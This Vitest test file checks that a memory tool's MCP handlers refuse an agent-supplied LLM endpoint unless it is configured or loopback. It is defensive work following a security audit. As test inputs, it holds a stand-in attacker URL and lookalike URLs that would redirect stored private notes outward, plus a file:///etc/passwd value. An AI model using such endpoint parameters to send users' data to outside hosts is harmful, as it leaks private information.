// Security audit 2026-11-06: an agent-supplied llm_base_url decides where the
// bulk engram contents are POSTed. The MCP tools accept it only when it is a
// loopback address or an endpoint the user listed under `llm.base_urls` in
// config.yaml; any other host is refused before anything is read or sent.
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { mkdtempSync, rmSync, writeFileSync } from 'fs'
import { join } from 'path'
import { tmpdir } from 'os'
import { Plur } from '@plur-ai/core'
import { getToolDefinitions } from '../src/tools.js'

const tools = getToolDefinitions('full')
const tool = (name: string) => tools.find(t => t.name === name)!
let dir: string, plur: Plur, calls: string[]

beforeEach(async () => {
  dir = mkdtempSync(join(tmpdir(), 'plur-llm-endpoint-'))
  writeFileSync(join(dir, 'config.yaml'), 'embeddings:\n  enabled: false\nllm:\n  base_urls:\n    - https://llm.example.invalid/v1/\n')
  plur = new Plur({ path: dir })
  await plur.learn('Private note: the staging password rotates monthly', { scope: 'global' })
  calls = []
  vi.spyOn(globalThis, 'fetch').mockImplementation(async (url: any) => {
    calls.push(String(url))
    return new Response(JSON.stringify({ choices: [{ message: { content: 'PROFILE-TEXT' } }] }), { status: 200 })
  })
})
afterEach(() => { vi.restoreAllMocks(); rmSync(dir, { recursive: true, force: true }) })

const attacker = { llm_base_url: 'https://attacker.example.invalid/v1', llm_api_key: 'dummy-key' }

describe('agent-supplied llm_base_url is bound to configured or loopback endpoints', () => {
  it('plur_profile refuses an unconfigured host and sends nothing', async () => {
    await expect(tool('plur_profile').handler({ ...attacker, force_regenerate: true }, plur)).rejects.toThrow(/llm_base_url/)
    expect(calls).toEqual([])
  })
  it('plur_extract_meta, plur_validate_meta, plur_tensions scan and plur_report_failure refuse it too', async () => {
    const [e] = await plur.list()
    await expect(tool('plur_extract_meta').handler({ ...attacker }, plur)).rejects.toThrow(/llm_base_url/)
    await expect(tool('plur_validate_meta').handler({ ...attacker, meta_engram_id: e.id, test_domain: 'x' }, plur)).rejects.toThrow(/llm_base_url/)
    await expect(tool('plur_tensions').handler({ ...attacker, scan: true }, plur)).rejects.toThrow(/llm_base_url/)
    await expect(tool('plur_report_failure').handler({ ...attacker, engram_id: e.id, failure_context: 'x' }, plur)).rejects.toThrow(/llm_base_url/)
    expect(calls).toEqual([])
  })
  it('a lookalike of the configured endpoint is refused', async () => {
    for (const url of ['https://llm.example.invalid.attacker.example/v1', 'https://user@llm.example.invalid/v1', 'http://llm.example.invalid/v1', 'file:///etc/passwd']) {
      await expect(tool('plur_profile').handler({ llm_base_url: url, llm_api_key: 'k', force_regenerate: true }, plur)).rejects.toThrow(/llm_base_url/)
    }
    expect(calls).toEqual([])
  })
  it.each([
    ['the configured endpoint', 'https://llm.example.invalid/v1'],
    ['a loopback endpoint', 'http://127.0.0.1:11434/v1'],
  ])('%s is accepted', async (_label, url) => {
    const r = await tool('plur_profile').handler({ llm_base_url: url, llm_api_key: 'k', force_regenerate: true }, plur)
    expect((r as any).source).toBe('generated')
    expect(calls).toEqual([`${url}/chat/completions`])
  })
  it('egress tools say so in their annotations; plur_profile is not read-only', () => {
    for (const name of ['plur_profile', 'plur_extract_meta', 'plur_validate_meta', 'plur_tensions', 'plur_report_failure']) {
      expect(tool(name).annotations?.openWorldHint, name).toBe(true)
    }
    expect(tool('plur_profile').annotations?.readOnlyHint).toBe(false)
  })
})
